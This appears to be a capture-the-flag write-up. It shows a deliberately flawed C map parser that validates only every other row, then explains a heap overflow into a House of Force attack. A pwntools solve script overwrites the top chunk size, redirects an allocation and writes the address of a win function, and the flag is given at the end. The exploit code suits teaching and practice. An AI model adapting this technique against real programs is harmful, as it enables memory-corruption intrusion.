`Binary`
The reversing of this part is really tedious, so I'm just going to do a mini writeup on the intended using the source code:
```c
void parse_map(unsigned int x, unsigned int y) {
    Map map = init_map(x, y);

    for (int i = 0; i < y; i++) {
        map.map_arr[i] = malloc(x);
    }

    int x_idx = 0;
    int row = 0;
    int readAmount = 0;
    char currentChar;

    while (readAmount < x * y) {
        currentChar = getchar();
        if (currentChar == '\n' || currentChar == '\0') {

            // if we just validate the parsing of every other row, we've saved
            // lots of work!
            if (row % 2 == 0) {
                if (x_idx != x) {
                    printf("You hurt yourself in your confusion! You need to draw squares!");
                    exit(-1);
                }
            }

            x_idx = 0;
            row++;
            continue;
        }

        if (currentChar == '\xdd') {
            printf("You decided to stop drawing for now\n");
            break;
        }

        map.map_arr[row][x_idx] = currentChar;
        x_idx++;
        readAmount++;
    }

    clear_screen();
    print_map(&map);
    shortest_path(&map);
}
```
This will always read `while (readAmount < x * y)`, that is `x*y` times. But you're allowed to just send newlines on every other line, and this will give you the ability to go out of bounds on the heap. We can use this to overwrite the top chunk (House of Force should be hinted by the heap leak perhaps), after that it's a pretty simple house of force. My solve script is a bit janky, but here it is:
```python
def pwn():
    io.recvuntil(b"please\n")
    io.sendline(b"50, 50")

    io.recvuntil(b"Before you begin drawing, an omniscent voice whispers: ")
    heap_leak = int(io.recvline().strip(), 16) + 0x10
    print(f"{heap_leak:#x}")

    pay = b"." * 50 + b"\n"
    for x in range(1,48):
        if x % 2 == 0:
            pay += b"."*45 + b"TZ" + b"."*3 + b"\n"
        else:
            pay += b"." + b"\n"

    pay += b"Z" * 50 + b"\n"
    
    pay += b"A"*56 + p64(0xfffffffffffffff1) + p8(0xdd)
    pause()
    io.sendline(pay)
    pause()
    io.sendline()
    io.sendline(b"Y")

    pay = (0x603070 + 0x40) - (heap_leak + 3990)
    io.sendline(f"{pay}".encode())
    
    io.sendlineafter(b"And your name:", p64(elf.symbols["win"]))
    io.interactive()
```

Flag: 
`TDCNET{d1jk5traS_s3cr3t_w4s_t0_us3_br34dth_f1rs7_s3arc8}`
